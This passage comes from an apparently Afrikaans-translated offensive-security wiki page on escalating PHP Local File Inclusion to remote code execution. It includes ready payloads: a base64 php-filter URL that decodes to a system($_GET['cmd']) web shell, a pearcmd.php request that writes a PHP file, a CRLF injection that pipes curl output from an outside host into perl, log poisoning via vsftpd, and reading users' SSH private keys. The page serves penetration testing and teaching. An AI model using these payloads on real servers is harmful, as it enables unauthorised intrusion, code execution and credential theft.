As ssh aktief is, kontroleer watter gebruiker gebruik word (/proc/self/status & /etc/passwd) en probeer toegang kry tot **\<HOME>/.ssh/id_rsa**

### **Deur** **vsftpd** _**loglêers**_

Die loglêers vir die FTP-server vsftpd bevind hulle by _**/var/log/vsftpd.log**_. In 'n scenario waar 'n Local File Inclusion (LFI) kwesbaarheid bestaan, en toegang tot 'n blootgestelde vsftpd-server moontlik is, kan die volgende stappe oorweeg word:

1. Inspuit 'n PHP payload in die gebruikersnaamveld tydens die aanmeldproses.
2. Na inspuiting, gebruik die LFI om die bedienerlogboeke van _**/var/log/vsftpd.log**_ te verkry.

### Deur php base64 filter (met base64)

Soos gewys in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artikel, die PHP base64 filter ignoreer net Non-base64. Jy kan dit gebruik om die lêeruitbreidingstoets te omseil: as jy base64 voorsien wat eindig met ".php", sal dit die "." eenvoudig ignoreer en "php" by die base64 aanheg. Hier is 'n voorbeeld payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (geen lêer nodig)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) verduidelik dat jy **php filters kan gebruik om arbitrêre inhoud te genereer** as uitset. Dit beteken basies dat jy **arbitrêre php code kan genereer** vir die include **sonder om dit in ’n lêer te skryf**.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** 'n lêer wat as **temporary** in `/tmp` gestoor sal word; dan, in dieselfde request, veroorsaak 'n **segmentation fault**, en die **temporary file won't be deleted** sodat jy daarna kan soek.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

As jy 'n **Local File Inclusion** gevind het en **Nginx** loop voor PHP, kan jy moontlik RCE verkry met die volgende tegniek:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

As jy 'n **Local File Inclusion** gevind het, selfs al **het jy nie 'n session nie** en `session.auto_start` is `Off`. As jy die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data verskaf, sal PHP die **session vir jou inskakel**. Jy kan dit misbruik om RCE te kry:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

As jy 'n **Local File Inclusion** gevind het en die bediener op **Windows** loop, kan jy moontlik RCE kry:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), die script `/usr/local/lib/phppearcmd.php` bestaan standaard in php docker images. Verder is dit moontlik om argumente aan die script via die URL deur te gee omdat dit aangedui word dat as 'n URL-param nie 'n `=` het nie, dit as 'n argument gebruik moet word. Sien ook [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) en [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die volgende request skep 'n lêer in `/tmp/hello.php` met die inhoud `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Die volgende misbruik 'n CRLF vuln om RCE te kry (van [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Deur phpinfo() (file_uploads = on)

As jy 'n **Local File Inclusion** gevind het en 'n lêer wat **phpinfo()** openbaar met file_uploads = on, kan jy RCE kry:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Deur compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

As jy 'n **Local File Inclusion** gevind het en jy **can exfiltrate the path** van die temp-lêer MAAR die **server** **is checking** of die **file to be included has PHP marks**, kan jy probeer om daardie **bypass that check** met hierdie **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Deur eternal waiting + bruteforce

As jy die LFI kan misbruik om **upload temporary files** en die server te laat **hang** die PHP-uitvoering, kan jy dan **brute force filenames during hours** om die tydelike lêer te vind:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Na Fatal Error

As jy enige van die lêers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` insluit. (Jy moet dieselfde een 2 keer insluit om daardie fout te veroorsaak).

**Ek weet nie hoe dit nuttig is nie, maar dit kan wees.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
